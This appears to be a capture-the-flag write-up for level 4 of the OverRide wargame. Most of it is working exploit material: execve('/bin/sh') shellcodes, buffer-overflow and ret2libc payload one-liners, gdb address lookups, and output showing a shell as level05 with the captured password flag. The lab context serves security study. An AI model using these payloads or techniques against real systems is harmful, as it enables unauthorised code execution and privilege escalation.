# LEVEL4

shellcode  (24) :

```
\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

shellcode (45) :
```
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
```

follow Child
```
set follow-fork-mode child
```

buffer-overflow : `156`

command python
```
python -c 'print("\x90" * 111 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\xc0\xd6\xff\xff")'
```

```
run < /tmp/test
```

all syscall 32bits
```
https://github.com/torvalds/linux/blob/v4.17/arch/x86/entry/syscalls/syscall_32.tbl#L17
```

ret2libc
```
https://beta.hackndo.com/retour-a-la-libc/
---------------------

[ buffer permettant d'atteindre l'overflow ] [ Adresse system() ] [ Adresse retour ] [ Adresse "/bin/sh" ]
```

find address system
```
Breakpoint 1, 0x080486c9 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

find /bin/sh
```
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```


ret2libc command
```
python -c 'print("\x90" * 156 + "\xd0\xae\xe6\xf7" + "AAAA" + "\xec\x97\xf8\xf7")'

```

Result :
```
level04@OverRide:~$ (python -c 'print("\x90" * 156 + "\xd0\xae\xe6\xf7" + "AAAA" + "\xec\x97\xf8\xf7")'; cat) | ./level04 
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

flag :
```
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```